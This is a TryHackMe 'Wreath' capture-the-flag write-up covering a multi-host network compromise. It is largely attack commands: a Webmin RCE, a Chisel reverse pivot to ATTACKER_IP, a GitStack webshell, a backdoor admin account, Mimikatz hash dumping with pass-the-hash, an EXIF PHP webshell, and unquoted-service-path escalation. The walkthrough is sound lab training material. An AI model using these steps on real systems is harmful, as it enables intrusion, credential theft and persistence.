# TryHackMe - Wreath

## Target Metadata

| Field | Value |
|---|---|
| Platform | TryHackMe |
| Room | Wreath |
| Path | Networks |
| Initial host | `10.200.180.200` |
| Domain | `thomaswreath.thm` |
| First OS | CentOS / Linux |
| Internal hosts | `10.200.180.150`, `10.200.180.100` |
| Main services | Webmin, SSH, GitStack, WinRM, RDP, PHP web app |

## Attack Chain Overview

```text
10.200.180.200 Webmin CVE-2019-15107 RCE
  -> root shell and SSH key
  -> internal discovery
  -> Chisel reverse SOCKS pivot
  -> 10.200.180.150 GitStack 2.3.10 RCE
  -> Windows admin shell
  -> WinRM/RDP stabilization
  -> Mimikatz SAM dump and pass-the-hash
  -> Chisel remote port forward to 10.200.180.100
  -> recover Website.git
  -> PHP upload filter bypass with ExifTool metadata webshell
  -> Windows service enumeration
  -> unquoted service path / writable service directory
  -> SYSTEM shell
```

## Table of Contents

1. [Summary](#summary)
2. [Reconnaissance](#reconnaissance)
3. [Initial Access - Webmin](#initial-access---webmin)
4. [Internal Pivoting](#internal-pivoting)
5. [GitStack RCE on 10.200.180.150](#gitstack-rce-on-10200180150)
6. [Windows Stabilization and Credentials](#windows-stabilization-and-credentials)
7. [Second Pivot to 10.200.180.100](#second-pivot-to-10200180100)
8. [PHP Upload Bypass](#php-upload-bypass)
9. [Privilege Escalation](#privilege-escalation)
10. [Key Takeaways](#key-takeaways)
11. [Related Notes](#related-notes)

## Summary

Wreath was a network chain rather than a single-host compromise. Initial access came from Webmin on `10.200.180.200` via CVE-2019-15107, yielding root and the root SSH private key. That foothold exposed the internal network and became the pivot point.

Chisel reverse SOCKS made `10.200.180.150` reachable. GitStack 2.3.10 was exploited through a public unauthenticated RCE, then the resulting Windows shell was upgraded into WinRM/RDP access. Local hashes were dumped with Mimikatz, and the Administrator NTLM hash was reused through Evil-WinRM pass-the-hash.

The final target, `10.200.180.100`, was reached through another Chisel remote port forward. The website Git repository revealed an upload filter weakness: a PHP payload stored in EXIF metadata and saved with a PHP extension executed as a webshell. Windows service enumeration then exposed a writable unquoted service path, which led to SYSTEM.

## Reconnaissance

Reusable commands were extracted into [nmap](../../../../tools/recon/nmap.md), [proxychains](../../../../tools/pivot/proxychains.md), [tcpdump](../../../../tools/creds/tcpdump.md), and the enumeration playbooks.

```bash
# What it does: send an ICMP Echo Request to the target.
# Why here: verify basic network reachability and latency before starting enumeration.
ping $TARGET -c1
# What it does: full TCP SYN port scan with high speed.
# Why here: discover all open ports on the initial target quickly.
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oN silent-web-server
nmap -sVC -p22,80,443,10000 $TARGET -oN service-web-server
# What it does: adds machine domains to /etc/hosts.
# Why here: resolve virtual hosts during web enumeration.
echo "$TARGET thomaswreath.thm" | sudo tee -a /etc/hosts
```

Open services on `10.200.180.200`: SSH, HTTP, HTTPS, and Webmin/MiniServ `1.890` on port `10000`.

## Initial Access - Webmin

Full technique: [Webmin 1.890 RCE](../../../../exploits/web-rce/webmin-cve-2019-15107-rce.md).

The Webmin service was vulnerable to unauthenticated RCE. The exploit returned a root shell, then the root SSH key was recovered for a stable foothold.

```bash
# What it does: execute the Webmin 1.890 unauthenticated RCE exploit.
# Why here: gain initial root access to the first host in the network.
python3 CVE-2019-15107.py $TARGET
# What it does: read the root SSH private key.
# Why here: obtain a persistent and stable foothold on the target.
cat /root/.ssh/id_rsa
# What it does: restrict permissions on the SSH key.
# Why here: satisfy SSH client security requirements for private key usage.
chmod 600 id_rsa
# What it does: log in as root via SSH using the recovered key.
# Why here: establish a reliable interactive management session.
ssh -i id_rsa root@$TARGET
```

## Internal Pivoting

Full technique: [Chisel pivoting](../../../../techniques/pivot/chisel.md). Related tool notes: [chisel](../../../../tools/pivot/chisel.md), [proxychains](../../../../tools/pivot/proxychains.md), [FoxyProxy](../../../../tools/pivot/foxyproxy.md), [sshuttle](../../../../tools/pivot/sshuttle.md), [plink](../../../../tools/pivot/plink.md), and [socat](../../../../tools/pivot/socat.md).

The first pivot exposed the internal network through a reverse SOCKS tunnel:

```bash
# Kali
# What it does: start a Chisel server in reverse mode.
# Why here: prepare to receive a reverse SOCKS connection from the compromised host.
./chisel server -p 15000 --reverse &

# 10.200.180.200
# What it does: connect to the Chisel server and establish a reverse SOCKS tunnel.
# Why here: make the internal network reachable via a SOCKS proxy.
./chisel client ATTACKER_IP:15000 R:socks &

# Kali through proxychains
# What it does: run Nmap through the SOCKS proxy.
# Why here: discover services on the second host (10.200.180.150) from the internal network.
proxychains nmap -sT -Pn -n 10.200.180.1-255 -oN scan
```

Important results:

```text
10.200.180.150
  80/tcp   open  http
  3389/tcp open  ms-wbt-server
  5357/tcp open  wsdapi
  5985/tcp open  wsman
```

## GitStack RCE on 10.200.180.150

Full technique: [GitStack 2.3.10 RCE](../../../../exploits/web-rce/gitstack-rce.md).

GitStack was reachable on port `80` through the SOCKS pivot and was vulnerable to a public unauthenticated RCE. The exploit uploaded a PHP webshell and command execution was triggered with `curl`.

```bash
# What it does: search Exploit-DB for GitStack vulnerabilities.
# Why here: find a public exploit for the detected web service.
searchsploit gitstack
searchsploit -m 43777
dos2unix 43777.py
# What it does: execute the Python exploit through proxychains.
# Why here: trigger unauthenticated RCE on the internal GitStack server.
proxychains /usr/bin/python2 43777.py
proxychains curl -X POST http://10.200.180.150/web/exploit-tryzub.php --data-urlencode "a=whoami"
```

The host could not reach Kali directly, so the shell was relayed through `10.200.180.200`:

```bash
# 10.200.180.200
# What it does: start a Chisel server on the pivot host.
# Why here: facilitate port forwarding to relay the reverse shell back to Kali.
./chisel server -p 16000 --reverse &
# What it does: add a firewall rule to allow traffic on port 16000.
# Why here: ensure the Chisel server is reachable from the target network.
firewall-cmd --zone=public --add-port=16000/tcp
# What it does: allow inbound traffic on port 4444.
# Why here: permit the reverse shell connection to pass through the host's firewall.
firewall-cmd --zone=public --add-port=4444/tcp

# Kali
# What it does: connect to the pivot host and forward the listener port.
# Why here: bridge the gap between the isolated internal network and the attacker machine.
./chisel client 10.200.180.200:16000 R:4444:127.0.0.1:4444 &
# What it does: set up a netcat listener to catch the relayed shell.
# Why here: receive the incoming connection from the second host via the Chisel tunnel.
rlwrap nc -lvnp 4444
```

## Windows Stabilization and Credentials

Full techniques: [Windows admin stabilization](../../../../privesc/windows/windows-admin-stabilization.md), [Mimikatz SAM dump and pass-the-hash](../../../../techniques/creds/mimikatz-sam-pth.md).

Once command execution landed as an administrator, a dedicated user was created for WinRM/RDP.

```cmd
REM What it does: create a new local user on the Windows system.
REM Why here: establish a secondary administrative account for stable RDP/WinRM access.
net user tryzub Tryzub@ /add
REM What it does: add the user to the local Administrators group.
REM Why here: grant full control over the host for post-exploitation.
net localgroup Administrators tryzub /add
REM What it does: add the user to the Remote Management Users group.
REM Why here: enable authentication over WinRM for Evil-WinRM sessions.
net localgroup "Remote Management Users" tryzub /add
REM What it does: query the status and properties of the newly created user.
REM Why here: verify that the account was correctly created and assigned to the right groups.
net user tryzub
```

```bash
# What it does: establish a WinRM session with the newly created admin user.
# Why here: gain a stable and interactive Windows management shell.
proxychains evil-winrm -u tryzub -p 'Tryzub@' -i 10.200.180.150
# What it does: open an RDP session for GUI-based post-exploitation.
# Why here: facilitate tool execution and manual enumeration on Windows.
proxychains xfreerdp /v:10.200.180.150 /u:tryzub /p:'Tryzub@' +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share /cert:ignore /sec:tls
```

Mimikatz was launched from the shared RDP drive, then local SAM hashes were dumped. The Administrator hash was reused through Evil-WinRM:

```cmd
\\tsclient\share\mimikatz\x64\mimikatz.exe
privilege::debug
token::elevate
log c:\windows\temp\mimikatz.log
lsadump::sam
```

```bash
# What it does: use Evil-WinRM to pass the Administrator NTLM hash.
# Why here: elevate access to the built-in Administrator account.
proxychains evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.180.150
```

## Second Pivot to 10.200.180.100

Full technique: [Chisel pivoting](../../../../techniques/pivot/chisel.md).

PowerShell Empire port-scanning scripts found ports `80` and `3389` on `10.200.180.100`, but Empire stager generation failed. Chisel was used instead.

```cmd
REM What it does: scan the target subnet for open ports using PowerShell.
REM Why here: identify active services on 10.200.180.100 from the perspective of 10.200.180.150.
Invoke-Portscan -Hosts 10.200.180.100 -TopPorts 50
REM What it does: add an inbound firewall rule for port 15001.
REM Why here: expose the local Chisel port for relaying traffic to the third host.
netsh advfirewall firewall add rule name="chisel-try" dir=in action=allow protocol=tcp localport=15001
```

```bash
# 10.200.180.200
./chisel-try server -p 16000 --reverse &
firewall-cmd --zone=public --add-port=15001/tcp

# 10.200.180.150
./chisel.exe client 10.200.180.200:16000 R:15001:10.200.180.100:80
```

The internal web app was then available through the pivot at:

```text
http://10.200.180.200:15001/
```

## PHP Upload Bypass

Full technique: [PHP EXIF metadata webshell upload](../../../../exploits/web-rce/php-exiftool-comment-webshell.md). Related tool note: [GitTools](../../../../tools/web/gittools.md).

The website source was recovered from `C:\GitStack\repositories\Website.git`. Reviewing the extracted commits showed an upload handler that did not safely validate PHP extensions when image metadata was present.

```cmd
REM What it does: compress the Git repository directory into a ZIP archive.
REM Why here: package the source code for easier exfiltration and local analysis.
Compress-Archive -Path C:\GitStack\repositories\Website.git -DestinationPath C:\Windows\Temp\website.zip
REM What it does: exfiltrate the ZIP archive from the target to the attacker machine.
REM Why here: obtain the source code for manual audit and Git history review.
download website.zip
```

```bash
# What it does: decompress the recovered Git repository.
# Why here: prepare the source code for manual security review.
unzip website.zip -d ./repos
# What it does: rename the directory to .git to use standard git tools.
# Why here: enable the usage of GitTools for history extraction.
mv Website.git .git
git clone https://github.com/internetwache/GitTools
/home/kali/Desktop/tools/GitTools/Extractor/extractor.sh . Website_extracted
# What it does: find all PHP files in the extracted repository.
# Why here: identify target files for upload filter logic analysis.
find . -name "*.php"
```

The working payload used a PHP webshell embedded in EXIF `Comment` metadata:

```bash
# What it does: rename the image to include a PHP extension.
# Why here: test the upload filter's handling of multiple extensions.
mv image.jpg image.jpeg.php
# What it does: inject the PHP webshell into the image's EXIF Comment field.
# Why here: bypass metadata-based file validation while maintaining a valid image structure.
exiftool -Comment="$(cat /tmp/payload.php)" image.jpeg.php
```

```text
http://10.200.180.200:15001/resources/uploads/inocent.jpeg.php?wreath=whoami
```

## Privilege Escalation

Full techniques: [Windows unquoted service path](../../../../privesc/windows/windows-unquoted-service-path.md), [Windows SAM hive dump](../../../../techniques/creds/windows-sam-hive-dump.md). Related playbook: [Windows enumeration](../../../../playbooks/enumeration/windows.md).

Manual service enumeration found `SystemExplorerHelpService` with a space-containing unquoted path under a directory writable by `BUILTIN\Users`.

```cmd
REM What it does: list privileges and groups for the current session.
REM Why here: determine the level of access and available escalation primitives.
whoami /priv
whoami /groups
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
sc qc SystemExplorerHelpService
REM What it does: check ACLs for the identified unquoted service path.
REM Why here: verify if the current user has write permissions to plant a binary.
powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
```

A small C# wrapper was compiled with Mono to execute `nc.exe`, placed in the vulnerable path, and triggered by restarting the service.

```bash
# What it does: compile a C# source file into an executable using Mono.
# Why here: create a custom wrapper to execute netcat for the privilege escalation exploit.
# mcs Wrapper.cs
```

```cmd
REM What it does: stop and start the vulnerable service.
REM Why here: trigger the execution of the planted binary in the unquoted path.
sc stop SystemExplorerHelpService
sc start SystemExplorerHelpService
```

SAM/SYSTEM hive dumping was also captured for offline extraction:

```cmd
REM What it does: export the SAM registry hive to a file.
REM Why here: prepare to extract local account NTLM hashes for credential recovery.
reg.exe save HKLM\SAM sam.bak
REM What it does: export the SYSTEM registry hive to a file.
REM Why here: obtain the boot key required to decrypt the SAM hive.
reg.exe save HKLM\SYSTEM system.bak
```

```bash
# What it does: parse the SAM and SYSTEM hive backups.
# Why here: extract local account hashes for offline cracking or pass-the-hash.
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

## Key Takeaways

- On network rooms, the first root shell is most valuable as a pivot point.
- Chisel handles reverse SOCKS and remote forwards when SSH is not enough.
- GitStack gave execution, but egress controls shaped the shell strategy.
- RDP drive sharing is handy for Windows tooling transfer.
- Git history review exposed the real upload weakness.
- Unquoted service paths matter when write permissions make binary planting possible.

## Related Notes

### Tools

- [nmap](../../../../tools/recon/nmap.md)
- [curl](../../../../tools/web/curl.md)
- [searchsploit](../../../../tools/recon/searchsploit.md)
- [chisel](../../../../tools/pivot/chisel.md)
- [proxychains](../../../../tools/pivot/proxychains.md)
- [FoxyProxy](../../../../tools/pivot/foxyproxy.md)
- [socat](../../../../tools/pivot/socat.md)
- [plink](../../../../tools/pivot/plink.md)
- [sshuttle](../../../../tools/pivot/sshuttle.md)
- [evil-winrm](../../../../tools/windows/evil-winrm.md)
- [xfreerdp](../../../../tools/windows/xfreerdp.md)
- [mimikatz](../../../../tools/windows/mimikatz.md)
- [PowerShell Empire](../../../../tools/windows/powershell-empire.md)
- [GitTools](../../../../tools/web/gittools.md)
- [exiftool](../../../../tools/web/exiftool.md)
- [netcat](../../../../tools/pivot/netcat.md)
- [impacket](../../../../tools/windows/impacket.md)

### Exploits / Techniques

- [Webmin 1.890 RCE](../../../../exploits/web-rce/webmin-cve-2019-15107-rce.md)
- [Chisel pivoting](../../../../techniques/pivot/chisel.md)
- [GitStack 2.3.10 RCE](../../../../exploits/web-rce/gitstack-rce.md)
- [Windows admin stabilization](../../../../privesc/windows/windows-admin-stabilization.md)
- [Mimikatz SAM dump and pass-the-hash](../../../../techniques/creds/mimikatz-sam-pth.md)
- [PowerShell Empire hop listener](../../../../techniques/pivot/powershell-empire-hop.md)
- [PHP EXIF metadata webshell upload](../../../../exploits/web-rce/php-exiftool-comment-webshell.md)
- [Windows unquoted service path](../../../../privesc/windows/windows-unquoted-service-path.md)
- [Windows SAM hive dump](../../../../techniques/creds/windows-sam-hive-dump.md)
- [Windows enumeration](../../../../playbooks/enumeration/windows.md)
